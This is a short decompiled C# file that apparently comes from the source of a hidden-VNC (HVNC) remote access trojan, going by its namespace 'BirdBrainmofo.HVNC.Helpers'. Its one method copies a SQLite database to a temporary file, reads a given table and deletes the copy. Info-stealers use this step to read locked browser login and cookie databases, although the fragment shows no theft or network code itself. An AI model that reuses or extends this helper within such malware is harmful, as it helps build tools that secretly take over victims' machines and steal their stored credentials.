using System.IO;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000E5 RID: 229
	public sealed class SqlReader
	{
		// Token: 0x060008ED RID: 2285 RVA: 0x00061894 File Offset: 0x0005FA94
		public static SqLite ReadTable(string database, string table)
		{
			SqLite sqLite;
			if (!File.Exists(database))
			{
				sqLite = null;
			}
			else
			{
				string text = Path.GetTempFileName() + ".dat";
				File.Copy(database, text);
				SqLite sqLite2 = new SqLite(text);
				sqLite2.ReadTable(table);
				File.Delete(text);
				sqLite = ((sqLite2.GetRowCount() == 65536) ? null : sqLite2);
			}
			return sqLite;
		}

		// Token: 0x060008EE RID: 2286 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
